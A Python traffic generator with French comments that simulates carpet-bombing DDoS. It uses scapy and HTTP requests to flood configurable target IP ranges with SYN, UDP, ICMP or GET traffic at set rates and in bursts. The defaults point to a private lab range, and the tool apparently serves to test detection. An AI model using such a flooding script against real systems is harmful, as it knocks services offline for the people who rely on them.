from __future__ import annotations

import argparse
import ipaddress
import random
import time
from pathlib import Path
from typing import Any

import requests
import yaml
from scapy.all import ICMP, IP, TCP, UDP, Raw, send

#Lecture d'un fichier de configuration YAML pour générer du trafic réseau
def load_config(path:str | None) -> dict[str, Any]:
    if not path:
        return {}
    with Path(path).open("r", encoding="utf-8") as f:
        return yaml.safe_load(f) or {}
    

#transforme l'entree cli des ips en liste ip
def parse_targets(value: str) -> list[str]:
    targets: list[str] = []

    for part in value.split(","):
        part = part.strip()
        if not part:
            continue

        if "-" in part:
            start, end = part.split("-", 1)
            start_ip = ipaddress.ip_address(start.strip())
            end_ip = ipaddress.ip_address(end.strip())
            targets.extend(str(ipaddress.ip_address(ip)) for ip in range(int(start_ip), int(end_ip) + 1))
        else:
            targets.append(str(ipaddress.ip_address(part)))

    return targets

#sert a choisir cmb d'ip cibles seront utilisées parmi toutes les ip données a --targets
def select_targets(targets: list[str], fanout: int, randomize:bool) -> list[str]:
    if fanout <= 0 or fanout >= len(targets):
        selected = list(targets)
    else:
        selected = random.sample(targets, fanout) if randomize else targets[:fanout]
    if randomize:
        random.shuffle(selected)

    return selected

def build_packet(dst: str, protocol: str, dst_port: int, packet_size: int):
    payload_len = max(0, packet_size - 40)  # 40 bytes for IP header
    payload = Raw(load=b"X" * payload_len) #genere une suite de XXXX

    if protocol == "icmp":
        return IP(dst=dst) / ICMP() / payload #le / est une syntaxe de scapy pour empiler les protocoles et les payloads

    if protocol == "tcp":
        sport = random.randint(1024, 65535)
        return IP(dst=dst) / TCP(sport=sport, dport=dst_port, flags="S") / payload

    if protocol == "udp":
        sport = random.randint(1024, 65535)
        return IP(dst=dst) / UDP(sport=sport, dport=dst_port) / payload

    raise ValueError(f"Unsupported raw protocol: {protocol}")

#envoie vraie requete http a dst:dst_port
def send_http(dst: str, dst_port: int, timeout: float = 1.0) -> None:
    url = f"http://{dst}:{dst_port}/" #construit url http
    try:
        requests.get(url, timeout=timeout) #envoie une vraie requete get
    except requests.RequestException:
        pass #ignore les erreurs pour continuer a envoyer du trafic

#orchestrateur entre scapy et http
#fonction qui construit et envoie un paquet selon les paramètres donnés
def emit_packet(dst: str, protocol: str, dst_port: int, packet_size: int) -> None:
    if protocol == "http":
        send_http(dst, dst_port) #focntion http, pas de scapy donc réseau linux qui gere TCP/IP
        return
    
    packet = build_packet(dst, protocol, dst_port, packet_size) #construit le paquet avec scapy
    send(packet, verbose=False) #envoie le paquet avec scapy, verbose=False pour ne pas afficher les détails de chaque envoi

# fonction principale qui orchestre la génération de trafic selon les paramètres donnés en ligne de commande
def run(args: argparse.Namespace) -> None:
    random.seed(args.seed) #initialise le générateur de nombres aléatoires avec la seed donnée pour reproducibilité
    targets = parse_targets(args.targets) #parse les cibles données en ligne de commande pour obtenir une liste d'ips
    targets = select_targets(targets, args.fanout, args.randomize_targets) #sélectionne un sous-ensemble de cibles selon le fanout et si on doit randomiser ou pas

    if args.scenario == "ddos_single":
        targets = targets[:1]
    elif args.scenario == "normal":
        args.rate = min(args.rate, 10)

    if not targets:
        raise ValueError("No target selected")
    
    interval = 1.0 / max(args.rate, 1) #debit de paquet par sec
    deadline = time.monotonic() + args.duration
    sent = 0

    #affiche les paramètres de la simulation avant de commencer
    print(
        f"scenario={args.scenario} duration={args.duration}s rate={args.rate}pps "
        f"protocol={args.protocol} targets={len(targets)}"
    )

    while time.monotonic() < deadline:
        burst_size = args.burst_size if args.burst_mode else 1

        for _ in range(burst_size):
            if time.monotonic() >= deadline:
                break

            dst = random.choice(targets) if args.randomize_targets else targets[sent % len(targets)] #choisit aleat ou en fct de l'ordre modulo du nombre de cibles
            emit_packet(dst, args.protocol, args.dst_port, args.packet_size)
            sent += 1

            if not args.burst_mode:
                time.sleep(interval)

        if args.burst_mode:
            time.sleep(args.burst_interval)

    print(f"sent_packets_or_requests={sent}")

#fonction pour fusionner les arguments de la ligne de commande avec ceux du fichier de configuration, en donnant la priorité à ceux de la ligne de commande
def merge_args(args: argparse.Namespace, config: dict[str, Any]) -> argparse.Namespace:
    for key, value in config.items(): #pour chaque clé-valeur du fichier de config
        cli_value = getattr(args, key, None) #recup la valeur de l'argument donné en ligne de commande
        if cli_value == parser.get_default(key): #si la valeur de la ligne de commande est celle par défaut, on remplace par celle du fichier de config
            setattr(args, key, value)
    return args

parser = argparse.ArgumentParser(description="Carpet Bombing Traffic Simulation") #objet qui lit les arguments de la ligne de commande
parser.add_argument("--scenario", choices=["normal", "ddos_single", "carpet_bombing"], default="normal", help="Traffic scenario to simulate")
parser.add_argument("--duration", type=int, default= 30, help="Duration of the simulation in seconds")
parser.add_argument("--rate", type=int, default=50, help="Average packet/request rate per second")
parser.add_argument("--targets", default="10.10.0.101-10.10.0.116", help="Comma-separated list of target IPs or ranges (e.g., 10.10.0.101-10.10.0.116)")
parser.add_argument("--protocol", choices=["icmp", "tcp", "udp", "http"], default="tcp", help="Protocol to use for traffic generation")
parser.add_argument("--packet-size", type = int, default = 128, help="Size of packets to send (for ICMP/TCP/UDP)")
parser.add_argument("--dst-port", type=int, default=80, help="Destination port for TCP/UDP/HTTP traffic")
parser.add_argument("--fanout", type=int, default=16, help="Number of target IPs to use")
parser.add_argument("--randomize-targets", action = "store_true", help="Randomize target selection and order") #action store_true pour que si l'option est présente, randomize_targets sera True, sinon False
parser.add_argument("--burst-mode", action="store_true", help="Enable burst mode (send packets in bursts instead of evenly spaced)")
parser.add_argument("--burst-size", type = int, default=100, help="Number of packets to send in each burst (only if --burst-mode is enabled)")
parser.add_argument("--burst-interval", type=float, default=1.0, help="Interval between bursts in seconds (only if --burst-mode is enabled)")
parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
parser.add_argument("--config", type=str, help="Path to YAML configuration file")

#ce bloc s'execute seulement si ce script est exécuté directement (et pas importé comme module)
if __name__ == "__main__":
    cli_args = parser.parse_args() #parse les arguments de la ligne de commande
    cfg = load_config(cli_args.config) #charge le fichier de configuration YAML
    run(merge_args(cli_args, cfg)) #fusionne les arguments de la ligne de commande avec ceux du fichier de config et lance la simulation